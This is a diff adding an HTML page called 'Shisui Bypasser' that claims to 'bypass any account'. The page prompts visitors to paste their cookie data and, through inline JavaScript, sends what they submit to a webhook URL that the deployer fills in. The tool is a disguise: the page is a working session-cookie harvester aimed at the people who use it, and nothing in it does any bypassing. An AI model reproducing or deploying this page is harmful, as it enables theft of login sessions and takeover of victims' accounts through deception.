@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Shisui Bypasser</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: Arial, sans-serif;
+      color: white;
+      overflow: hidden;
+    }
+
+    .title-container {
+      text-align: center;
+      position: relative;
+      margin-bottom: 50px;
+    }
+
+    .title-container h1 {
+      font-size: 3em;
+    }
+
+    .crown-icon {
+      position: absolute;
+      top: -40px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 2em;
+      color: gold;
+    }
+
+    .circle {
+      position: absolute;
+      border-radius: 50%;
+      animation: moveCircles 5s infinite linear;
+      opacity: 0.8;
+    }
+
+    .circle.red {
+      width: 20px;
+      height: 20px;
+      background-color: red;
+      animation-duration: 5s;
+    }
+
+    .circle.blue {
+      width: 25px;
+      height: 25px;
+      background-color: blue;
+      animation-duration: 6s;
+    }
+
+    @keyframes moveCircles {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(100px, 100px); }
+      50% { transform: translate(200px, 0); }
+      75% { transform: translate(100px, -100px); }
+      100% { transform: translate(0, 0); }
+    }
+
+    .button {
+      background-color: transparent;
+      border: 2px solid white;
+      color: white;
+      padding: 15px 30px;
+      margin: 10px;
+      font-size: 1.2em;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-radius: 8px;
+      transition: background-color 0.3s;
+    }
+
+    .button:hover {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .button i {
+      font-size: 1.5em;
+    }
+
+    .form-container {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .form-container input {
+      padding: 10px;
+      font-size: 1em;
+      margin: 10px 0;
+      width: 250px;
+    }
+
+    .form-container button {
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      font-size: 1.2em;
+      border-radius: 5px;
+    }
+
+    .form-container button:hover {
+      background-color: darkred;
+    }
+  </style>
+</head>
+<body>
+  <div class="title-container">
+    <div class="crown-icon"><i class="fas fa-crown"></i></div>
+    <h1>Shisui Bypasser</h1>
+  </div>
+
+  <!-- Animated Small Circles -->
+  <div class="circle red"></div>
+  <div class="circle blue"></div>
+
+  <!-- Buttons -->
+  <button class="button" onclick="redirectToBypassAccount()">
+    <i class="fas fa-bolt"></i> Bypassers Can Bypass Any Account
+  </button>
+  <button class="button">
+    <i class="fas fa-bolt"></i> BackUp Bypasser Required Password
+  </button>
+
+  <!-- Form Container -->
+  <div class="form-container" id="form-container">
+    <h2>Enter the Cookie Information</h2>
+    <form id="cookie-form">
+      <input type="text" id="cookieInput" placeholder="Enter Cookie Data" required />
+      <br />
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    // If current path is /AnyForceAccount, show the form
+    if (window.location.pathname.includes("/AnyForceAccount")) {
+      document.getElementById("form-container").style.display = "block";
+    }
+
+    function redirectToBypassAccount() {
+      window.location.href = "/AnyForceAccount";
+    }
+
+    document.getElementById("cookie-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const cookieData = document.getElementById("cookieInput").value;
+      const webhookUrl = "YOUR_WEBHOOK_URL"; // 🔁 Replace this with your actual webhook URL!
+
+      const payload = {
+        content: `@everyone @here Cookie Data: ${cookieData}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+        .then((response) => {
+          if (response.ok) {
+            alert("Cookie sent successfully!");
+          } else {
+            alert("Failed to send. Check webhook URL.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("Error sending data.");
+        });
+    });
+  </script>
+</body>
+</html>
